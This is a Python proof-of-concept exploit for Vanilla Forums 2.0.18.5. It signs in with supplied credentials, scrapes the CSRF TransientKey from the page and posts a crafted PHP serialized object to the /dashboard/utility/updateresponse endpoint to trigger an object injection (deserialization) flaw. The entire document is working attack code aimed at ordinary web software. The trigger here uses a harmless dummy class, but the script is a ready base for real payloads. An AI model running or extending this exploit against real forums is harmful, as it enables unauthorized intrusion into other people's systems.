# Vanilla Forums (2.0.18.5) - PoC
import requests
import sys
import base64
from bs4 import BeautifulSoup
import urllib.parse

def printUsageAndExit():
    print("[#] Usage: python [BASEURL] [USERID] [USERPW]")
    exit()

def login(baseurl, adminid, adminpw):
    URL = "{}{}".format(baseurl, "/entry/signin")
    login_data = {
            "CheckBoxes[]": "RememberMe",
            "DeliveryMethod": "JSON",
            "DeliveryType": "Veiw",
            "Form/ClientHour": "2019-10-29 20:28",
            "Form/Email": adminid,
            "Form/hpt": "",
            "Form/Password": adminpw,
            "Form/Sign_In": "Sign In",
            "Form/Target": "discussions",
            "Form/TransientKey": "4UOZDPPC622K"
            }
    with requests.Session() as session:
        r = session.post(URL, data = login_data)
        if(r.text.find("FormSaved\":false") > -1):
            print("[!] Login Failed!");
            exit()
        else:
            return session

if __name__ != '__main__':
    exit()

if(len(sys.argv) < 4):
    printUsageAndExit()

BASEURL = sys.argv[1]
ADMINID = sys.argv[2]
ADMINPW = sys.argv[3]

# Get Token (TransientKey)
session = login(BASEURL, ADMINID, ADMINPW)
token_req = session.get("{}".format(BASEURL))
soup = BeautifulSoup(token_req.text, features="html.parser")
token = soup.find("input", {"type":"hidden", "id":"TransientKey"})['value']

TRIGGER_INPUT = 'O:17:"dummy_class_r353t":1:{s:12:"used_methods";a:0:{}}'
# Submit PAYLOAD
PAYLOAD = {
        "Messages": "1", # "a:{}".format(sys.argv[2]),
        "Response": "a:{}".format(TRIGGER_INPUT),
        "TransientKey": token
        }

poc_req = session.post("{}{}".format(BASEURL, "/dashboard/utility/updateresponse"),
                            data = PAYLOAD)
# print(poc_req.text)
